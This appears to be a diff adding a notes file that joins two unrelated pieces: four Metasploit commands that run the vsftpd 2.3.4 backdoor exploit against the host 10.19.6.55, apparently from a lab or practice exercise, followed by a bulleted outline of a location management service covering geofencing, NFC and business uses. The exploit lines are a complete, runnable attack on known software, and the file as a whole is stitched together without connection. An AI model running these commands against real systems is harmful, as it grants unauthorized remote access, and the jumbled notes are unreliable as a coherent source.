@@ -1,0 +1,25 @@
+search ftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.19.6.55
+exploit
+
+
+*Location Management Service*
+Geo-Referencing Service
+Unlock Portals
+Access Control and Logging
+Situational Awareness
+
+*What does it use?*
+Uses:
+Geofencing technology
+Geographic Information
+Wireless database access
+Near Field Communications
+
+*App:*
+Location Data of Enrolled Clients for Business Use
+For Safety
+Life enhancing
+Risk Management
+Security Management
